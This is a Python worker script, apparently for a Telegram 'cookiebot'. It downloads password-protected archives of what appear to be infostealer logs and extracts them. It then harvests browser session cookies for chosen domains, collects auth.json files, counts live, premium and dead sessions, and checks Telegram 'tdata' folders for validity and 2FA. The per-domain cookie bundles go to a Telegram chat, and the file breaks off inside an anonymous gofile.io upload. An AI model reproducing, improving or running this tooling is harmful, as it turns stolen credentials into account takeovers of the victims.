import glob, json, multiprocessing, os, platform, queue, re, shutil, socket, subprocess, sys, threading, time, zipfile
from concurrent.futures import ProcessPoolExecutor, as_completed
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
import requests

VM_LIFE  = int(3360)                     # lifetime cap advertised on the card
TG       = os.environ.get("BOT_TOKEN") or ""  # injected by the workflow from repo secrets
TG_API   = "https://api.telegram.org/bot" + TG + "/"
CHAT     = None
PB       = [0.0, None, None, 0]  # [last publish, card message id, job t0, publish count]
WORK  = Path("/tmp/job")
OUT   = Path("/tmp/out")
PROG  = OUT / "progress.json"
CORES = os.cpu_count() or 1
DOMS  = []

_state = {"stage": "boot", "pct": 0, "err": None, "cores": CORES, "job": None}
_flush = [0.0]

RULE   = "━━━━━━━━━━━━━━━━━━━━━━━━━━"
THIN   = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
STAGE_ICON = {'boot': '🟡', 'idle': '🟢', 'installing': '🧩', 'download': '📥', 'downloaded': '✅', 'extract': '📦', 'extracted': '✅', 'wrong_password': '🔑', 'scan': '🔍', 'authcheck': '🔎', 'tdatacheck': '🗂', 'packed': '🗃', 'done': '🏁', 'error': '❌', 'cancelled': '🛑', 'cancelling': '🛑', 'queued': '⏳', 'retired': '♻️', 'ttl_expired': '♻️'}
VM_TTL = 3600
class _Ref:
    ref = 'rojaskomar67-ops/cookiebot-vm'
    born = time.time()
vm = _Ref()
def esc(x) -> str:
    return str(x if x is not None else "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def bold(x) -> str:
    return f"<b>{esc(x)}</b>"

def code(x) -> str:
    return f"<code>{esc(x)}</code>"

def fmt_size(num) -> str:
    num = float(num or 0)
    for u in ("B", "KB", "MB", "GB", "TB"):
        if num < 1024:
            return f"{num:.1f} {u}"
        num /= 1024
    return f"{num:.1f} PB"

def fmt_time(s) -> str:
    s = int(max(0, s or 0))
    if s < 60:
        return f"{s}s"
    m, s = divmod(s, 60)
    if m < 60:
        return f"{m}m {s}s"
    h, m = divmod(m, 60)
    return f"{h}h {m}m"

def bar(pct, width: int = 10) -> str:
    pct = max(0, min(100, int(pct or 0)))
    f = round(pct / 100 * width)
    return "🟨" * f + "⬜" * (width - f)

def gold_header(title: str, sub: str = "") -> str:
    head = f"👑 {bold('G O L D  ·  ' + title)} 👑\n{RULE}"
    if sub:
        head += f"\n{bold(sub)}"
    return head

def vm_card(p: dict, job: dict) -> str:
    """Hardware + lifetime panel for the CPU Space running this job."""
    vm_ = p.get("vm") or {}
    if not vm_:
        return f"🖥 {bold('VM')} booting — specs will appear in a moment…"
    age = (time.time() - vm.born) / 60 if vm.born else 0.0
    rows = [
        f"🖥 {bold('VM')}     {code(vm.ref or '?')}",
        f"🧠 {bold('CPU')}    {code(vm_.get('cores', '?'))} vCPU · {esc(str(vm_.get('cpu', 'unknown'))[:46])}",
        f"🐏 {bold('RAM')}    {code(vm_.get('ram', '?'))}"
        + (f" · free {code(vm_.get('ram_free', '?'))}" if vm_.get("ram_free") else ""),
        f"💽 {bold('DISK')}   {code(vm_.get('disk', '?'))}"
        + (f" · free {code(vm_.get('disk_free', '?'))}" if vm_.get("disk_free") else ""),
        f"🐧 {bold('OS')}     {code(vm_.get('os', '?'))} · host {code(vm_.get('host', '?'))}",
        f"🎮 {bold('GPU')}    {code(vm_.get('gpu', 'none'))} · py {code(vm_.get('py', '?'))}",
        f"♻️ {bold('LIFE')}   {code(f'{age:.1f}m / {VM_TTL // 60}m to recycle')}"
        f" · load {code(vm_.get('avg_load', '-'))}",
    ]
    return "\n".join(rows)

def stage_panel(p: dict) -> str:
    stage = p.get("stage", "queued")
    pct = p.get("pct", 0)
    lines = [f"{STAGE_ICON.get(stage, '⚙️')} {bold(stage.upper())}   {code(str(pct) + '%')}",
             bar(pct)]

    if stage in ("download", "downloaded") and p.get("got") is not None:
        got, tot = p.get("got"), p.get("total", "?")
        elapsed = p.get("elapsed") or p.get("dl_time") or "-"
        lines.append(f"📁 {code(got)} / {code(tot)}   ⚡ {code(p.get('speed', '-'))}   ⏱ {code(elapsed)}")
        if p.get("file"):
            lines.append(f"🏷 {code(p['file'])} ({code(fmt_size(p.get('size')))})")

    if stage in ("extract", "extracted", "wrong_password") and p.get("files_total"):
        files = f"{p.get('files', 0)}/{p.get('files_total')}"
        lines.append(f"📄 {code(files)}   💾 {code(p.get('extracted', '-'))}")
        lines.append(f"⚡ {code(p.get('ex_speed', '-'))}   👷 {code(p.get('file_speed', '-'))}   "
                     f"⏳ ETA {code(p.get('eta', '-'))}   ⏱ {code(p.get('elapsed', '-'))}")
        if p.get("engine"):
            load = f"{p['core_load']:.1f}" if p.get("core_load") else "-"
            lines.append(f"🧵 {code(p['engine'])} · threads {code(p.get('threads', '?'))} · load {code(load)}")
        if p.get("last_file"):
            lines.append(f"📝 {code(p['last_file'])}")
        if stage == "wrong_password":
            lines.append(f"🔑 {code(p.get('tried', '?'))} {bold('rejected')}")

    if stage in ("scan", "packed") and p.get("log_files") is not None:
        pd = p.get("per_domain") or {}
        det = "  ".join(f"{code(k)}={code(v)}" for k, v in pd.items()) or code("-")
        scanned = f"{p.get('scanned', 0)}/{p.get('log_files')}"
        lines.append(f"📂 {code(scanned)} logs   🍪 {code(p.get('sessions', 0))} sessions")
        lines.append(f"🧠 {code(p.get('cores', '?'))} cores · {code(p.get('workers', '?'))} workers")
        lines.append(f"🗂 {det}")
        if p.get("auth") is not None:
            lines.append(f"🔑 {code(p.get('auth'))} auth.json found")

    if stage == "authcheck" and p.get("auth_total"):
        tot_a = p.get("auth_total") or 1
        done_a = p.get("checked", 0)
        lines.append(f"🔑 {code('%d / %d' % (done_a, p.get('auth_total', 0)))}"
                     f"  {bar(done_a * 100 // tot_a)}")
        lines.append(f"✅ {code(p.get('live', 0))} live "
                     f"(💰 {code(p.get('prem', 0))} premium · 🆓 {code(p.get('free', 0))})")
        lines.append(f"⏳ {code(p.get('expired', 0))} expired   "
                     f"❌ {code(p.get('dead', 0))} dead   "
                     f"⚠️ {code(p.get('err', 0))} error   🌍 {code(p.get('proxies', 0))} proxies")

    if stage == "tdatacheck" and p.get("tk_total"):
        lines.append(f"🗃 {code('%d folders' % p.get('tk_total', 0))}"
                     f"  {bar((p.get('tk_done') or 0) * 100 // max(p.get('tk_total'), 1))}")
        lines.append(f"✅ {code(p.get('tk_valid', 0))} valid "
                     f"(👑 {code(p.get('tk_prem', 0))} premium · 🔒 {code(p.get('tk_2fa', 0))} 2FA)")
        lines.append(f"🧊 {code(p.get('tk_frozen', 0))} frozen   "
                     f"💀 {code(p.get('tk_dead', 0))} dead   ⏳ {code(p.get('tk_err', 0))} retrying"
                     f"   🌍 {code(p.get('tk_proxies', 0))} proxies")

    if stage == "error" and p.get("err"):
        lines.append(f"⚠️ {bold('Error')}: {code(p.get('err'))}")
    return "\n".join(lines)

def live_text(job) -> str:
    p = job.get("prog") or {}
    wall = fmt_time(time.time() - job["t0"])
    return (f"{gold_header('COOKIE EXTRACTION', 'GitHub CPU Runner · Live Console')}\n"
            f"{THIN}\n"
            f"{stage_panel(p)}\n"
            f"{THIN}\n"
            f"{vm_card(p, job)}\n"
            f"{THIN}\n"
            f"⏳ {bold('Wall time')} {code(wall)}   🆔 {code(job['id'])}")


def job_ctx():
    return {"prog": _state, "t0": PB[2] or time.time(), "id": _state.get("job") or "-"}

def pub(force=False):
    """Edit the user's live gold card straight from the Space (no bot-side polling)."""
    if not CHAT or not PB[1]:
        return
    n = time.time()
    hot = force and _state.get("stage") in ("done", "error", "cancelled",
                                            "wrong_password", "idle", "retired")
    if n - PB[0] < (0.5 if hot else 2.5):
        return
    PB[0] = n
    try:
        r = requests.post(TG_API + "editMessageText", timeout=30, json={
            "chat_id": CHAT, "message_id": PB[1], "text": live_text(job_ctx()),
            "parse_mode": "HTML"})
        if r.status_code == 200:
            PB[3] += 1
        elif "message is not modified" not in (r.text or ""):
            sys.stdout.write("tg edit %s: %s\n" % (r.status_code, r.text[:150])); sys.stdout.flush()
    except Exception as e:
        sys.stdout.write("tg edit failed: %s\n" % e); sys.stdout.flush()

def new_card(text):
    """Post a fresh gold message and return its id (used when there is no card to edit)."""
    if not CHAT:
        return None
    try:
        r = requests.post(TG_API + "sendMessage", timeout=30, json={
            "chat_id": CHAT, "text": text, "parse_mode": "HTML"})
        return (r.json().get("result") or {}).get("message_id")
    except Exception as e:
        sys.stdout.write("tg send failed: %s\n" % e); sys.stdout.flush()
        return None

def report(payload, tries=1):
    """Emit the terminal result on stdout; the bot reads it from the run's log."""
    sys.stdout.write("RESULT " + json.dumps(payload, separators=(",", ":")) + "\n")
    sys.stdout.flush()
    return True

def upload(name, caption):
    """Send a result file straight from the VM to the user's chat."""
    if not TG or not CHAT: return False
    try:
        with open(name, "rb") as fh:
            # requests cannot mix json= and files=: the fields must travel as multipart data.
            r = requests.post(TG_API + "sendDocument",
                              data={"chat_id": CHAT, "caption": caption,
                                    "parse_mode": "HTML"},
                              files={"document": (name.split("/")[-1], fh)}, timeout=300)
        if r.status_code != 200:
            sys.stdout.write("tg send %s: %s\n" % (name, r.text[:200])); sys.stdout.flush()
        return r.status_code == 200
    except Exception as e:
        sys.stdout.write("tg send error: %s\n" % e); sys.stdout.flush()
        return False

def ft(s):
    s = int(max(0, s or 0))
    if s < 60: return "%ds" % s
    m, s = divmod(s, 60)
    if m < 60: return "%dm %ds" % (m, s)
    h, m = divmod(m, 60); return "%dh %dm" % (h, m)

def fs(b):
    b = float(b or 0)
    for u in ("B", "KB", "MB", "GB", "TB"):
        if b < 1024: return "%.1f %s" % (b, u)
        b /= 1024
    return "%.1f PB" % b

def st(stage, pct=None, err=None, **kw):
    _state["stage"] = stage
    if pct is not None: _state["pct"] = max(0, min(100, int(pct)))
    if err is not None: _state["err"] = err
    _state.update(kw)
    flush(True)

def tick(stage, pct=None, **kw):
    """High-frequency progress: throttled to 1.5s to avoid hammering the disk."""
    _state["stage"] = stage
    if pct is not None: _state["pct"] = max(0, min(100, int(pct)))
    _state.update(kw)
    flush(False)

def flush(force=False):
    n = time.time()
    if not force and n - _flush[0] < 1.5: return
    _flush[0] = n
    _state["hb"] = n
    try:
        OUT.mkdir(parents=True, exist_ok=True)
        blob = json.dumps(_state)
        PROG.write_text(blob)
        sys.stdout.write("PROGRESS " + blob + "\n"); sys.stdout.flush()
    except Exception: pass
    if not _state.get("booting"):
        pub(force)

def stop():
    return (OUT / "cancel.flag").exists()

def run(c, **kw):
    return subprocess.run(c, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                          text=True, errors="ignore", **kw)

def vm_specs():
    """Hardware profile of the Space container this job runs on."""
    s = {"cpu": "unknown", "cores": CORES, "threads": CORES, "ram": "?", "ram_mb": 0,
         "disk": "?", "disk_gb": 0, "os": "?", "host": socket.gethostname(),
         "gpu": "none (CPU VM)", "avg_load": "-"}
    try:
        for ln in open("/proc/cpuinfo"):
            if ln.lower().startswith("model name"):
                s["cpu"] = ln.split(":", 1)[1].strip(); break
    except Exception: pass
    try:
        s["threads"] = len(os.sched_getaffinity(0))
    except Exception: pass
    try:
        p = Path("/proc/meminfo").read_text()
        mb = int(re.search(r"MemTotal:\s+(\d+)", p).group(1)) // 1024
        s["ram_mb"] = mb; s["ram"] = fs(mb * 1024 * 1024)
        free_mb = int(re.search(r"MemAvailable:\s+(\d+)", p).group(1)) // 1024
        s["ram_free"] = fs(free_mb * 1024 * 1024)
    except Exception: pass
    try:
        u = os.statvfs("/")
        gb = u.f_blocks * u.f_frsize / 1024 ** 3
        s["disk_gb"] = round(gb, 1); s["disk"] = "%.1f GB" % gb
        s["disk_free"] = "%.1f GB" % (u.f_bavail * u.f_frsize / 1024 ** 3)
    except Exception: pass
    try:
        s["avg_load"] = "%.2f / %.2f / %.2f" % os.getloadavg()
    except Exception: pass
    try:
        s["os"] = " ".join(platform.freedesktop_os_release().get("PRETTY_NAME", "?").split())
    except Exception:
        try: s["os"] = "Linux %s" % platform.release()
        except Exception: pass
    try:
        r = run(["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"])
        if r.returncode == 0 and r.stdout.strip():
            s["gpu"] = r.stdout.strip().splitlines()[0]
    except Exception: pass
    try:
        s["py"] = sys.version.split()[0]
    except Exception: pass
    return s

def apt(pkgs):
    if not shutil.which("apt-get"): return False
    try:
        run(["apt-get", "update", "-qq"], timeout=900)
        return run(["apt-get", "install", "-y", "-qq"] + list(pkgs), timeout=1200).returncode == 0
    except Exception: return False

# ── Netscape cookie parser (HttpOnly preserved) ──
def parse_cookie(line):
    line = line.rstrip("\r\n")
    if not line.strip(): return None
    if line.startswith("#") and not line.startswith(("#HttpOnly_", "#HttpOnly.")): return None
    pre, chk = "", line.strip()
    if chk.startswith("#HttpOnly_"): pre, chk = "#HttpOnly_", chk[10:]
    elif chk.startswith("#HttpOnly."): pre, chk = "#HttpOnly.", chk[10:]
    p = chk.split("\t")
    if len(p) >= 7:
        dom, flag, path, sec, exp, name = p[:6]; val = "\t".join(p[6:])
    else:
        p = re.split(r"\s+", chk, maxsplit=6)
        if len(p) != 7: return None
        dom, flag, path, sec, exp, name, val = p
    dom, name = dom.strip(), name.strip()
    if not dom or not name or not val.strip(): return None
    fl = "TRUE" if flag.strip().upper() in ("TRUE", "1") else "FALSE"
    sc = "TRUE" if sec.strip().upper() in ("TRUE", "1") else "FALSE"
    fmt = "\t".join([pre + dom, fl, path.strip() or "/", sc, exp.strip() or "0", name, val])
    return (dom.lower(), name, val, fmt)

def scan_file(path):
    """One log file -> one cookie session {domain: [(name, val, line), ...]}"""
    per_dom = {}
    try:
        with open(path, "rb") as fh:
            data = fh.read()
    except Exception:
        return per_dom
    if not data:
        return per_dom
    low = data.lower()
    if DOMS and not any(d.encode() in low for d in DOMS):
        return per_dom            # cheap reject: the domain never appears in the file
    try:
        text = data.decode("utf-8", "ignore")
    except Exception:
        return per_dom
    for raw in text.splitlines():
        if "\t" not in raw and raw.count(" ") < 6:
            continue
        c = parse_cookie(raw)
        if not c: continue
        dom, name, val, fmt = c
        for d in DOMS:
            if d in dom:
                per_dom.setdefault(d, []).append((name, val, fmt))
    return per_dom

def scan_chunk(paths):
    return [scan_file(p) for p in paths]

# ── 1. download ──
PD_HOSTS   = ("pixeldrain.com", "pixeldrain.net", "pixeldra.in", "pixeldrain.nl",
              "pixeldrain.biz", "pixeldrain.tech", "pixeldrain.dev")
PD_PROXIES = ("pd.cybar.xyz", "pd.1drv.eu.org")      # mirrors, they take bare /<id>
PD_ID      = re.compile(r"[A-Za-z0-9_-]{4,20}\Z")
PD_ARC     = re.compile(r"\.(zip|rar|7z|tar|gz|tgz)\Z", re.I)
PD_HDRS    = {"User-Agent": "Mozilla/5.0"}

def pd_host(url):
    m = re.search(r"https?://([^/\s?#]+)", url)
    return m.group(1).lower() if m else ""

def pd_parts(url, host):
    """('file' | 'list', id, item, err) — err only when the link is Pixeldrain but
    names nothing we can pull (so aria2c never streams an HTML page)."""
    segs = [s for s in url.split("://", 1)[1][len(host):].split("#")[0]
            .split("?")[0].split("/") if s]
    im = re.search(r"item=(\d+)", url.split("#", 1)[1] if "#" in url else "")
    item = int(im.group(1)) if im else None
    if len(segs) > 2 and segs[0] == "api" and segs[1] in ("file", "list"):
        return ("list" if segs[1] == "list" else "file"), segs[2], item, None
    if len(segs) > 1 and segs[0] in ("u", "f", "l") and PD_ID.match(segs[1]):
        return ("list" if segs[0] == "l" else "file"), segs[1], item, None
    if len(segs) == 1 and host in PD_PROXIES and PD_ID.match(segs[0]):
        return "file", segs[0], item, None
    if segs[:1] == ["d"]:
        return None, None, None, "pixeldrain folder (/d/) link — send one /u/ archive link"
    return None, None, None, "no file id in that pixeldrain link (…/u/XXXXXXXX)"

def resolve(url):
    """(direct URL, filename, size, err). Pixeldrain share pages are HTML, so
    /u/ and /l/ links become the real API download URL; every other link is
    handed to aria2c untouched. /info matters — plain /api/file/<id> IS the file."""
    host = pd_host(url)
    if host not in PD_HOSTS + PD_PROXIES:
        return url, None, 0, None
    kind, pid, item, err = pd_parts(url, host)
    if err:
        return None, None, 0, err
    api = "https://%s/api/" % ("pixeldrain.com" if host in PD_PROXIES else host)
    try:
        body = requests.get((api + "list/" + pid) if kind == "list"
                            else (api + "file/" + pid + "/info"),
                            timeout=30, headers=PD_HDRS).json()
    except Exception as e:
        return None, None, 0, "pixeldrain lookup failed: %s" % str(e)[:90]
    if not body.get("success", True):
        return None, None, 0, "pixeldrain: %s" % (body.get("message") or
                                                  body.get("value") or "link not found")
    files = [f for f in (body.get("files") if kind == "list" else [body])
             if isinstance(f, dict) and f.get("name")]
    if not files:
        return None, None, 0, "pixeldrain: nothing behind that link (deleted, private or empty)"
    if item is not None and item < len(files):
        files = [files[item]]
    if len(files) > 1:
        files = [f for f in files if PD_ARC.search(f["name"])]
        if not files:
            return None, None, 0, "pixeldrain folder holds no .zip/.rar/.7z archive"
    pick = max(files, key=lambda f: f.get("size") or 0)
    avail = (pick.get("availability") or "").strip()
    if avail:
        return None, None, 0, "pixeldrain: %s" % (pick.get("availability_message") or avail)
    return (api + "file/%s?download" % (pick.get("id") or pid),
            re.sub(r'[\\/:*?"<>|]+', "_", pick["name"])[:100],
            int(pick.get("size") or 0), None)

def download(url):
    dest = WORK / "dl"; dest.mkdir(parents=True, exist_ok=True)
    _state["err"] = None
    marker = dest / ".url"
    if marker.exists() and marker.read_text() == url:
        for e in ("*.zip", "*.rar", "*.7z", "*.ZIP", "*.RAR", "*.tar", "*.gz"):
            for cand in glob.glob(str(dest / e)):
                if os.path.isfile(cand) and os.path.getsize(cand) > 0:
                    st("downloaded", 30, file=Path(cand).name, cached=True,
                       size=fs(os.path.getsize(cand)),
                       msg="same link — reusing the archive already on this VM")
                    return Path(cand)
    src, fname, fsize, err = resolve(url)
    if err:
        _state["err"] = err
        st("error", err=err); return None
    if src != url:
        st("download", 4, msg="pixeldrain link resolved → %s (%s)"
           % (fname or "?", fs(fsize) if fsize else "?"))
        url = src
    if not shutil.which("aria2c"):
        st("installing", 3); apt(["aria2", "p7zip-full", "unrar-free"])
    use_aria = shutil.which("aria2c") is not None
    st("download", 4, engine="aria2c (16 chunks)" if use_aria else "requests")
    t0 = time.time()
    found = None
    if use_aria:
        cmd = [ "aria2c", "--dir", str(dest), "--split=16", "--max-connection-per-server=16",
                "--min-split-size=1M", "--file-allocation=none", "--auto-file-renaming=false",
                "--allow-overwrite=true", "--console-log-level=warn", "--summary-interval=1",
                "--user-agent=Mozilla/5.0" ]
        if fname:
            cmd += ["--out", fname]
        cmd.append(url)
        pr = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              text=True, errors="ignore", bufsize=1)
        pe = re.compile(r"\[#\w+\s+([\d.]+\w+)/([\d.]+\w+)\((\d+)%\)")
        se = re.compile(r"DL:([\d.]+\w+)")
        tail = []
        for raw in pr.stdout:
            if stop():
                pr.terminate(); return None
            tail.append(raw.strip())
            tail = tail[-25:]
            m = pe.search(raw)
            if m:
                s = se.search(raw)
                st("download", 4 + int(m.group(3)) * 0.26, got=m.group(1), total=m.group(2),
                   speed=(s.group(1) + "/s") if s else "-", elapsed=ft(time.time() - t0))
            fm = re.search(r"Download complete:\s*(.+)", raw)
            if fm: found = fm.group(1).strip()
        pr.wait()
        if pr.returncode not in (0, None):
            sys.stdout.write("ARIA2 FAIL rc=%s\n%s\n" % (pr.returncode, "\n".join(tail)))
            sys.stdout.flush()
            st("error", err="download_failed(rc=%s) %s" %
               (pr.returncode, " ".join(tail[-3:])[:150]))
            return None
    else:
        found = slow_dl(url, dest, t0, fname)
        if found is None:
            st("error", err=_state.get("err") or "download_failed"); return None
    if not found or not os.path.isfile(found):
        cand = []
        for e in ("*.zip", "*.rar", "*.7z", "*.ZIP", "*.RAR"):
            cand += glob.glob(str(dest / e))
        cand = cand or [str(p) for p in dest.iterdir()
                        if p.is_file() and p.name != ".url"]
        if not cand:
            st("error", err="archive_not_found"); return None
        found = cand[0]
    try:
        marker.write_text(url)
    except Exception:
        pass
    st("downloaded", 30, file=Path(found).name, size=fs(os.path.getsize(found)),
       dl_time=ft(time.time() - t0))
    return Path(found)

def slow_dl(url, dest, t0, name=None):
    import requests
    from urllib.parse import unquote
    nm = name or unquote(url.split("?")[0].rstrip("/").split("/")[-1])
    if not re.search(r"\.(zip|rar|7z)$", nm, re.I): nm = "archive.zip"
    tgt = dest / nm
    with requests.get(url, stream=True, timeout=900,
                      headers={"User-Agent": "Mozilla/5.0"}) as r:
        r.raise_for_status()
        tot = int(r.headers.get("content-length") or 0); done = 0
        with open(tgt, "wb") as f:
            for ch in r.iter_content(1 << 20):
                if stop(): return None
                f.write(ch); done += len(ch)
                st("download", 4 + (done * 26 // tot if tot else 0), got=fs(done),
                   total=fs(tot) if tot else "?", elapsed=ft(time.time() - t0))
    return str(tgt)

# ── 2. extract (all cores; tries every supplied password, never re-downloads) ──
def atype(p):
    try:
        with open(p, "rb") as f: mg = f.read(8)
        if mg.startswith(b"Rar!\x1a\x07"): return "rar"
        if mg.startswith(b"PK\x03\x04"): return "zip"
    except Exception: pass
    return "rar" if Path(p).suffix.lower() in (".rar", ".r00") else "zip"

FILTERS = ("*.txt", "*.log", "*.cookie", "*.cookies", "auth.json", "Auth.json")

def nfiles(tool, arc, pwd, filters=None):
    try:
        name = os.path.basename(tool)
        if "unrar" in name:
            c = [tool, "lb", "-p%s" % pwd if pwd else "-p-", str(arc)]
        else:
            c = [tool, "l", str(arc)] + (["-p%s" % pwd] if pwd else [])
            if filters:
                c += ["-i!" + f for f in filters]
        ls = [l for l in run(c).stdout.splitlines() if l.strip()]
        return sum(1 for l in ls if re.search(r"\d{4}-\d{2}-\d{2}", l)) or len(ls) or 1
    except Exception: return 1

def dstat(p):
    fl = [f for f in Path(p).rglob("*") if f.is_file()]
    return len(fl), sum(f.stat().st_size for f in fl)

def extract(arc, out, pwds):
    """Only text files can contain cookies, so extract them first with an include
    filter (far less I/O on mixed archives); fall back to a full extract."""
    ok, why = _extract(arc, out, pwds, FILTERS)
    if not ok and why not in ("wrong_password", "cancelled"):
        ok, why = _extract(arc, out, pwds, None)
    return ok, why

def _extract(arc, out, pwds, filters):
    out.mkdir(parents=True, exist_ok=True)
    t = atype(arc)
    if not any(shutil.which(x) for x in ("7zz", "7z", "7za")): apt(["p7zip-full"])
    if t == "rar" and not any(shutil.which(x) for x in ("unrar", "unrar-free", "unar")):
        apt(["unrar-free"])
    # 7zz (7-Zip 23+) decodes RAR5 and is much faster than unrar-free; unar and
    # unrar stay as fallbacks for archives 7-Zip rejects.
    order = (["7zz", "7z", "7za", "unrar", "unrar-free", "unar"] if t == "rar"
             else ["7zz", "7z", "7za", "unar", "unrar", "unrar-free"])
    tools = [p for p in (shutil.which(x) for x in order) if p]
    if not tools:
        st("error", err="no_extractor_on_vm"); return False, "tool_missing"
    badpwd = False
    for tool in tools:
        tot = nfiles(tool, arc, (pwds or [None])[0], filters)
        for pwd in (pwds or [None]):
            if stop(): return False, "cancelled"
            name = os.path.basename(tool)
            if "unrar" in name:
                cmd = [tool, "x", "-o+", "-y", "-p%s" % pwd if pwd else "-p-",
                       str(arc), str(out).rstrip("/") + "/"]
            elif name == "unar":
                cmd = [tool, "-f", "-D", "-o", str(out), str(arc)]
            else:
                cmd = [tool, "x", str(arc), "-o%s" % out, "-y", "-mmt=%d" % CORES]
                if pwd: cmd.append("-p%s" % pwd)
                if filters:
                    cmd += ["-ir!" + f for f in filters]
            st("extract", 31, engine=os.path.basename(tool), files_total=tot,
               using_password=bool(pwd), threads=CORES, last_file="")
            t0 = time.time()
            # stderr merged into stdout: an undrained stderr pipe deadlocks the
            # extractor once it warns on 64 KB, which froze big archives mid-run.
            pr = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                  stdin=subprocess.DEVNULL, text=True,
                                  errors="ignore", bufsize=1)
            done = 0
            sz = 0
            sz_t = 0.0
            tail = []
            act = [time.time()]
            base_free = shutil.disk_usage(str(out)).free

            def watch(proc=pr, act=act):
                last_free = shutil.disk_usage(str(out)).free
                while proc.poll() is None:
                    time.sleep(10)
                    try:
                        cur = shutil.disk_usage(str(out)).free
                    except Exception:
                        continue
                    if cur < last_free - (1 << 20):
                        last_free, act[0] = cur, time.time()
                    elif time.time() - act[0] > 600:
                        proc.kill()
                        return
            threading.Thread(target=watch, daemon=True).start()

            rx = re.compile(r"^(Extracting|-\s+\S|x\s+\S)", re.I)
            for raw in pr.stdout:
                if stop():
                    pr.kill(); return False, "cancelled"
                line = raw.strip()
                tail.append(line)
                if len(tail) > 200: tail.pop(0)
                if rx.search(line):
                    done += 1
                    act[0] = time.time()
                    el = time.time() - t0
                    rate = done / el if el > 0 else 0
                    eta = (tot - done) / rate if rate > 0 else 0
                    if time.time() - sz_t >= 2.0:
                        sz_t = time.time()
                        try: sz = max(0, base_free - shutil.disk_usage(str(out)).free)
                        except Exception: pass
                    nm = line.split()[-1] if line else ""
                    tick("extract", 31 + min(done * 12 // max(tot, 1), 12),
                         files=done, files_total=tot, extracted=fs(sz),
                         ex_speed=fs(sz / el) + "/s" if el > 0 else "-",
                         file_speed="%d f/s" % rate if rate else "-",
                         eta=ft(eta), elapsed=ft(el), last_file=Path(nm).name[:40],
                         core_load=os.getloadavg()[0] if hasattr(os, "getloadavg") else 0)
            pr.wait()
            out_txt = "\n".join(tail).lower()
            if pr.returncode == 11 or any(k in out_txt for k in
                   ("wrong password", "bad password", "corrupt file or wrong password",
                    "data error in encrypted", "enter password")):
                badpwd = True
                st("wrong_password", 31, tried=str(pwd)); continue
            n, sz = dstat(out)
            if pr.returncode in (0, 1) and n:
                st("extracted", 43, files=n, extracted=fs(sz), ex_time=ft(time.time() - t0))
                return True, "ok"
    return False, ("wrong_password" if badpwd else "corrupt")

# ── 3. cookie search on every core + packaging ──
def search_pack(ex, want_auth=True):
    """One tree walk collects both scan targets: cookie logs and auth.json."""
    files, auths = [], []
    for p in ex.rglob("*"):
        try:
            if not p.is_file(): continue
        except OSError:
            continue
        n = p.name.lower()
        if n == "auth.json":
            if want_auth:
                auths.append(p)
        elif n.endswith((".txt", ".log", ".cookie", ".cookies")):
            files.append(str(p))
    tot = len(files)
    st("scan", 44, log_files=tot, cores=CORES,
       auth=len(auths) if want_auth else None)
    sess = {d: [] for d in DOMS}; seen = {d: set() for d in DOMS}
    if tot:
        size = 256          # small chunks: progress + cancellation stay live on huge trees
        chunks = [files[i:i + size] for i in range(0, tot, size)]
        # parsing is I/O bound, so oversubscribe the cores (2× vCPU, min 4)
        nw = min(len(chunks), max(4, CORES * 2))
        mp_ctx = multiprocessing.get_context("fork")
        with ProcessPoolExecutor(max_workers=nw, mp_context=mp_ctx) as ex_pool:
            futs = [ex_pool.submit(scan_chunk, c) for c in chunks]
            scanned = found_c = 0
            for fut in as_completed(futs):
                for per_file in fut.result():
                    scanned += 1
                    if stop(): return {}, []
                    for d, items in per_file.items():
                        sig = tuple(sorted((n, v) for n, v, _ in items))
                        if not sig or sig in seen[d]: continue
                        seen[d].add(sig)
                        sess[d].append([fmt for _n, _v, fmt in items])
                        found_c += 1
                tick("scan", 44 + min(scanned * 40 // max(tot, 1), 40),
                     scanned=scanned, log_files=tot, cores=CORES,
                     workers=nw, sessions=found_c,
                     auth=len(auths) if want_auth else None,
                     per_domain={d: len(v) for d, v in sess.items() if v})
    hdr = "# Netscape HTTP Cookie File\n# https://curl.se/docs/http-cookies.html\n\n"
    packed = {}
    for d, sessions_ in sess.items():
        if not sessions_: continue
        pack_domain(d, sessions_, hdr)
        packed[d] = len(sessions_)
    st("packed", 92, found=packed,
       auth=len(auths) if want_auth else None)
    return packed, auths

def pack_auth(auths):
    """All auth.json files in one auth.zip, renamed 1st_auth.json, 2nd_auth.json…"""
    if not auths: return None, []
    zp = OUT / "auth.zip"
    rels = []
    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
        for i, p in enumerate(auths, 1):
            name = "%s_auth.json" % ordn(i)
            try: rel = str(p.relative_to(WORK / "ex"))
            except Exception: rel = p.name
            rels.append((name, rel))
            try: z.write(str(p), name)
            except Exception: pass
    return zp, rels

def ordn(n):
    suf = "th" if 10 <= n % 100 <= 20 else {1: "st", 2: "nd", 3: "rd"}.get(n % 10, "th")
    return "%d%s" % (n, suf)

def pack_domain(dom, sessions_, hdr):
    """One zip per domain, split into parts under Telegram's 50 MB upload cap.
    The cap applies to the compressed file, which is always <= the text size,
    so a 45 MB raw limit per part is safe."""
    LIMIT = 45 << 20
    base = re.sub(r"[^\w.-]", "_", dom.lower())
    for old in OUT.glob(base + "*.zip"):
        try: old.unlink()
        except Exception: pass
    part, cur, raw = 0, None, 0
    for i, session_lines in enumerate(sessions_, 1):
        blob = hdr + "\n".join(session_lines) + "\n"
        if cur is None:
            part += 1
            name = OUT / ("%s.zip" % base if part == 1
                          else "%s.part%d.zip" % (base, part))
            cur, raw = zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED), 0
        cur.writestr("%d.txt" % i, blob)
        raw += len(blob)
        if raw >= LIMIT:
            cur.close(); cur = None
    if cur:
        cur.close()
    if part > 1:
        full = OUT / ("%s.full.zip" % base)
        with zipfile.ZipFile(full, "w", zipfile.ZIP_DEFLATED) as z:
            for i, session_lines in enumerate(sessions_, 1):
                z.writestr("%d.txt" % i, hdr + "\n".join(session_lines) + "\n")

def gofile(path):
    """Anonymous gofile.io upload; returns the download page for a full zip."""
    try:
        srv = (requests.get("https://api.gofile.io/servers", timeout=30).json()
               .get("data", {}).get("servers") or [])
    except Exception as e:
